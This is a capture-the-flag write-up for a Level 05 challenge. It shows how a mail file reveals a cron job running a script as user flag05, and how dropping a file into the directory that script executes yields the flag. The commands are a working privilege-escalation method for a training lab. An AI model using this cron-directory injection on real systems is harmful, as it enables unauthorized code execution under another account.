# Level 05


<br>

### >> [Flag file](../flag) <<

<br>


## Explanation:


#### Step 1:

- When we log in as `level05`, we can see a little message:
```
You have new mail.
```

- So let's check the mail folder:
```bash
ls -laR /var/mail
```

> ```
> drwxrwsr-x  1 root mail  60 Mar  5  2016 .
> drwxr-xr-x  1 root root 160 Mar 12  2016 ..
> -rw-r--r--+ 1 root mail  58 Oct  6 13:47 level05
> ```


#### Step 2:

- Let's check what's inside the `level05` mail file:
```bash
cat /var/mail/level05
```

> ```
> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
> ```

> [!TIP]
> A mail file can contain a cron job. In this case, the cron job is executed every 2 minutes and runs the `openarenaserver` program as the user `flag05`.


#### Step 3:

- What's in the `openarenaserver` program?
```bash
cat /usr/sbin/openarenaserver
```

> ```bash
> #!/bin/sh
> 
> for i in /opt/openarenaserver/* ; do
> 	(ulimit -t 5; bash -x "$i")
> 	rm -f "$i"
> done
> ```
> So the `openarenaserver` program executes all the scripts in the `/opt/openarenaserver/` directory and then deletes them.


#### Step 4:

- We just need to create a script in the `/opt/openarenaserver/` directory that will execute the `getflag` command.
```bash
echo 'getflag > /tmp/flagResult' > /opt/openarenaserver/completelyLegitScript
```


#### Step 5:

- Wait for the cron job to run and then check the `/tmp/flagResult` file:
```bash
while [ ! -f /tmp/flagResult ]; do sleep 1; done; cat /tmp/flagResult
```


<br>

---

[<<](/level04/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level06/resources/Readme.md)
